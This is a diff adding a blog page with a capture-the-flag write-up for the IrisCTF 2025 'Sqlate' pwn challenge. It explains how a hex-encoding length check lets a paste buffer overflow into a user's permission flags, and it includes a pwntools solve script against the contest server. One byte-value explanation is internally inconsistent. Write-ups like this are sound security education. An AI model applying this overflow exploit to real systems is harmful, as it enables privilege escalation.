@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+Sqlate IrisCTF 2025 (pwn) | XeroExecute Blog
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hugo 0.147.2">
+
+
+<link rel="canonical" href="https://XeroExecute.github.io/posts/sqlate/" >
+
+
+
+
+<link href="/css/style.min.9a2b65a89f4b739d182c3eee1059252ff56c1ba33d40d97d6f7f4c6e35c2b476.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="https://XeroExecute.github.io/">
+                <span>blog@XeroExecute.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://XeroExecute.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Sqlate IrisCTF 2025 (pwn)</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/pwn/">#Pwn</a><span></span>
+    <a href="/tags/ctf/">#Ctf</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2025-01-06">January 6, 2025</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>3 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    
+    <aside class="toc-container">
+        <h2>Table of Contents</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a></li>
+    <li><a href="#flag">Flag</a></li>
+  </ul>
+</nav>
+    </aside>
+    
+    <div>
+        <p>This past week I played in <a href="https://2025.irisc.tf/">IrisCTF 2025</a> and tackled a pwnable called <a href="https://2025.irisc.tf/challenge-id-41.html">&ldquo;Sqlate&rdquo;</a>, authored by lambda. It was presented as a pastebin app, with the challenge title hinting at SQLite use — and as expected, SQL injection was a red herring. This writeup covers how I bypassed the intended flow by leveraging a length-check bug in the base16 encoding logic.</p>
+<h2 id="description">Description</h2>
+<p>World‘s most secure paste app.</p>
+<h2 id="solution">Solution</h2>
+<p>We’re given source code for a paste app. The goal is to trigger the function <code>action_sys</code> which will print the flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">action_sys</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From the program&rsquo;s menu, we can see that there&rsquo;s a permission check before calling this function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="sc">&#39;7&#39;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">check_permissions</span><span class="p">(</span><span class="n">permission_root</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">action_sys</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>check_permissions</code> function checks the current user&rsquo;s flags:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">check_permissions</span><span class="p">(</span><span class="k">const</span> <span class="kt">int</span> <span class="n">perms</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Current Perms: %ldn&#34;</span><span class="p">,</span> <span class="n">current_user</span><span class="p">.</span><span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Perms: %dn&#34;</span><span class="p">,</span> <span class="n">perms</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Current Userid: %dn&#34;</span><span class="p">,</span> <span class="n">current_user</span><span class="p">.</span><span class="n">userId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">current_user</span><span class="p">.</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">perms</span><span class="p">)</span> <span class="o">!=</span> <span class="n">perms</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You don&#39;t have permissions to perform this action!n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">current_user</span><span class="p">.</span><span class="n">userId</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You might need to login to unlock this.n&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>You&rsquo;re supposed to log in as admin to get root permissions. But we can’t guess or extract the password. That leaves us with these functions:</p>
+<ul>
+<li><code>action_create</code> → creates an entry in SQLite</li>
+<li><code>action_update</code> → updates an entry</li>
+<li><code>action_info</code> → shows an entry</li>
+<li><code>action_list</code> → lists entries</li>
+</ul>
+<p>Only <code>update</code> looks promising. It lets you pick an encoding:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Which modifier?</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;1) None</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;2) Hex</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;3) Base64</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></div><p>There’s a logic bug in the Hex (<code>modifier 2</code>) length check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;3&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">temp</span> <span class="o">=</span> <span class="nf">base64_encode</span><span class="p">(</span><span class="n">line_buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strlen</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">)</span> <span class="nf">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Attempted to overflow!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">line_buffer</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;2&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strlen</span><span class="p">(</span><span class="n">line_buffer</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">192</span><span class="p">)</span> <span class="nf">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Attempted to overflow!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The check is done <strong>before</strong> hex encoding, so we can write 192 bytes → <strong>384 hex characters</strong>, but the actual buffer is only 256 bytes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">paste</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">rowId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">title</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">language</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">content</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>Memory-wise, the <code>user</code> struct follows the <code>paste</code> struct:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">user</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">userId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>That means overflowing <code>content</code> lets us overwrite <code>flags</code> in <code>current_user</code>. That’s how we gain elevated perms!</p>
+<p>I overwrote the <code>flags</code> with 0xA0 (from ASCII &lsquo;D&rsquo;), which gave <code>current_user.flags = 16688</code>. But it turns out the required <code>permission_root = 256</code> is satisfied by that flag because:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">current_user</span><span class="p">.</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">perms</span><span class="p">)</span> <span class="o">!=</span> <span class="n">perms</span><span class="p">)</span>
+</span></span></code></pre></div><p>&hellip;passes, since (16688 &amp; 256 = 256).</p>
+<p><img src="/sqlate.png" alt="Memory Overwrite"></p>
+<p>solve.py</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;./vuln&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = gdb.debug(binary, &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    continue</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#&#39;&#39;&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;sqlate.chal.irisc.tf&#39;</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_menu_choice</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_paste</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">language</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_menu_choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter Title: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter Language: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">language</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter Content: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_paste</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">modifier</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_menu_choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">modifier</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter content: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter Title: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list_all</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_menu_choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">raw_payload_D</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;D&#34;</span> <span class="o">*</span> <span class="mi">146</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Creating initial paste...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create_paste</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;D&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Updating paste with malicious payload...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_paste</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="n">raw_payload_D</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">list_all</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">send_menu_choice</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="flag">Flag</h2>
+<p>This triggers <code>action_sys</code> and prints the flag.</p>
+<hr>
+<p><strong>Writeup by <a href="https://x.com/XeroExecute">XeroExecute</a></strong><br>
+Challenge: <a href="https://2025.irisc.tf/challenge-id-41.html">Sqlate</a><br>
+CTF: <a href="https://2025.irisc.tf">IrisCTF 2025</a></p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 XeroExecute Blog, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
